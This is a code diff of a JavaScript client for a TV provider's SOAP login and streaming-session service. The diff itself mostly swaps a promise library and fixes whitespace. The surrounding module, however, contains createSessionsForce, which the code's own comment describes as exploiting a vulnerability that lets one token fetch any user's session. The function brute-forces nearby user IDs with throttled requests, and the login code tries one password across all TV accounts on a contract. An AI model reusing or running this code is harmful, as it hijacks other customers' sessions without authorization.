@@ -1,7 +1,7 @@
 import soap from 'soap';
 import xml from 'xml';
 import axios from 'axios';
-import promiseAny from 'promise-any';
+import Promise from 'bluebird';
 
 import {login as accountLogin, getTvContractAuthKeys, getTvContractsData} from './my-partner.js';
 import PromiseThrottle from 'promise-throttle';
@@ -45,7 +45,7 @@ const handleLoginResponse = result => {
 
 const loginToTvContract = async (loginSoapClient, {userName, devices}, password) => {
     const ACTION_NAME = 'CheckSubsAuthAndCreateToken';
-    
+
     if (!devices[0]) {
         throw new Error('Cannot find TV device. Please make sure you logged in to the app at least once');
     }
@@ -70,9 +70,9 @@ export const login = async (idNumber, lastDigits, password) => {
 
     // Trying all tv accounts with the given password and waiting for the first successfull one
     try {
-        return await promiseAny(tvContracts.map(x => loginToTvContract(loginSoapClient, x, password)));
-    } catch ([error]) {
-        throw error;
+        return await Promise.any(tvContracts.map(x => loginToTvContract(loginSoapClient, x, password)));
+    } catch (errors) {
+        throw errors[0];
     }
 };
 
@@ -160,13 +160,15 @@ export const createSessions = (...params) => {
 };
 
 // This exploits a vulnerability where the same token can be used to fetch any user's session
-export const createSessionsForce = async (channelId, {userId: strUserId, token}) => {
+export const createSessionsForce = (channelId, {userId: strUserId, token}) => {
     const NUMBER_OF_TRIES = parseInt(process.env.BRUTE_FORCE_TRIES) ?? 50;
     const TRIES_EACH_DIRECTION = NUMBER_OF_TRIES / 2;
     const WAIT = parseInt(process.env.BRUTE_FORCE_WAIT_MS) ?? 250;
-    const userId = parseInt(strUserId); 
+    const userId = parseInt(strUserId);
 
-    const promiseThrottle = new PromiseThrottle({requestsPerSecond: WAIT === 0 ? Number.MAX_SAFE_INTEGER : 1000 / WAIT});
+    const promiseThrottle = new PromiseThrottle({
+        requestsPerSecond: WAIT === 0 ? Number.MAX_SAFE_INTEGER : 1000 / WAIT
+    });
 
     const promises = [];
 
@@ -181,5 +183,5 @@ export const createSessionsForce = async (channelId, {userId: strUserId, token})
         promises.push(pt);
     }
 
-    return promiseAny(promises).catch(() => []);
+    return Promise.any(promises).catch(() => []);
 };
